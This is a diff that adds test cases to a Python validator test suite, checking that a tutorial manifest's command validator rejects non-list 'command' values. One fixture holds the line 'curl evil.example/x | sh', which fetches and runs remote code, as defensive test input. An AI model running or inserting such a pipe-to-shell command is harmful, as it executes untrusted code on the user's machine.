@@ -599,6 +599,101 @@ def m_validator_missing_field(root: Path) -> None:
     )
 
 
+CARGO_CHECK_DECL = "cargo-check: { kind: command, command: [cargo, check] }"
+
+
+def _redeclare_cargo_check(root: Path, literal: str, expected: object) -> None:
+    """Rewrite the `cargo-check` validator and prove what `command` parses to.
+
+    The same shape as _declare_teaching_method, for the same reason: every
+    case below turns on the TYPE the reader hands check 8 - str, list, a
+    list holding an int, an empty list - and a quoting slip would silently
+    turn a case into a test of something else that still passes. The
+    measured hole (tutorAIl#31: `command: "curl evil.example/x | sh"` exits
+    0 with no finding) is a STRING where a list was meant, so asserting the
+    parsed type is the whole of the fixture verification.
+    """
+    manifest = root / "tutorial.yaml"
+    assert CARGO_CHECK_DECL in manifest.read_text(), (
+        "this baseline does not declare cargo-check in the expected form, so "
+        "the fixture would be asserting about the wrong validator"
+    )
+    edit(manifest, CARGO_CHECK_DECL, literal)
+    parsed = vb.load_yaml(manifest.read_text(), "tutorial.yaml")
+    assert isinstance(parsed, dict), "the mutated manifest no longer parses"
+    vdef = parsed.get("validators", {}).get("cargo-check")
+    assert isinstance(vdef, dict), f"cargo-check parsed to {vdef!r}, not a mapping"
+    assert vdef.get("kind") == "command", (
+        f"cargo-check's kind parsed to {vdef.get('kind')!r}, so this fixture "
+        f"is not exercising check 8's command rule"
+    )
+    got = vdef.get("command")
+    assert got == expected and type(got) is type(expected), (
+        f"command parsed to {got!r} ({type(got).__name__}), not "
+        f"{expected!r} ({type(expected).__name__})"
+    )
+
+
+def m_command_is_a_shell_string(root: Path) -> None:
+    """The exact line tutorAIl#31 measured passing in silence."""
+    _redeclare_cargo_check(
+        root,
+        'cargo-check: { kind: command, command: "curl evil.example/x | sh" }',
+        "curl evil.example/x | sh",
+    )
+
+
+def m_command_is_a_plain_string(root: Path) -> None:
+    """The same hole with nothing alarming in it.
+
+    `cargo check` as a string is the honest authoring mistake the rule is
+    for, and it must fire exactly as the shell pipeline above does. A check
+    that only caught the frightening spelling would be a blocklist.
+    """
+    _redeclare_cargo_check(
+        root,
+        "cargo-check: { kind: command, command: cargo check }",
+        "cargo check",
+    )
+
+
+def m_command_is_an_empty_list(root: Path) -> None:
+    _redeclare_cargo_check(root, "cargo-check: { kind: command, command: [] }", [])
+
+
+def m_command_holds_a_number(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        "cargo-check: { kind: command, command: [cargo, 3] }",
+        ["cargo", 3],
+    )
+
+
+def m_command_holds_an_empty_string(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        'cargo-check: { kind: command, command: [cargo, "", check] }',
+        ["cargo", "", "check"],
+    )
+
+
+def m_command_is_a_mapping(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        "cargo-check:\n    kind: command\n    command:\n      run: cargo check",
+        {"run": "cargo check"},
+    )
+
+
+def m_command_is_a_list(root: Path) -> None:
+    """LEGAL and silent - the declaration every bundle already ships.
+
+    The control for all six above. Without it they prove only that check 8
+    reports something, not that it reports the wrong shape in particular.
+    """
+    _redeclare_cargo_check(root, CARGO_CHECK_DECL, ["cargo", "check"])
+
+
 def m_id_not_slug_shaped(root: Path) -> None:
     edit(root / "tutorial.yaml", "id: rust-automaton-db", "id: Rust_AutomatonDB")
 
@@ -2691,6 +2786,36 @@ CASES: list[Case] = [
          m_validator_unknown_kind, "kind 'file-exsits' is not one of"),
     Case("8: a validator omits a required field", 8, "automaton", "bundle",
          m_validator_missing_field, "requires the field 'path'"),
+    # ---- check 8's command type rule (tutorAIl#31, design section 6.1). The
+    # measured hole is the first case: before this rule, a `command` that was
+    # a shell string exited 0 with no finding.
+    Case("8: a command validator's command is a shell string", 8, "automaton",
+         "bundle", m_command_is_a_shell_string,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is a plain string", 8, "automaton",
+         "bundle", m_command_is_a_plain_string,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is an empty list", 8, "automaton",
+         "bundle", m_command_is_an_empty_list,
+         "is an empty list, so there is no program to run",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command holds a number", 8, "automaton",
+         "bundle", m_command_holds_a_number,
+         "entry at position 1 is int: 3",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command holds an empty string", 8,
+         "automaton", "bundle", m_command_holds_an_empty_string,
+         "entry at position 1 is an empty string",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is a mapping", 8, "automaton",
+         "bundle", m_command_is_a_mapping,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    # ---- check 8's command rule, the positive direction. Without this every
+    # case above proves only that check 8 reports SOMETHING.
+    Case("8: a command validator's command is a list - legal, silent", 8,
+         "automaton", "bundle", m_command_is_a_list, kind="silent"),
+    Case("8: the same, in instance mode", 8, "automaton", "instance",
+         m_command_is_a_list, kind="silent"),
     Case("8: the bundle id is not [a-z0-9-]+", 8, "automaton", "bundle",
          m_id_not_slug_shaped, "must match [a-z0-9-]+"),
     Case("8: a manifest key appears twice", 8, "automaton", "bundle",
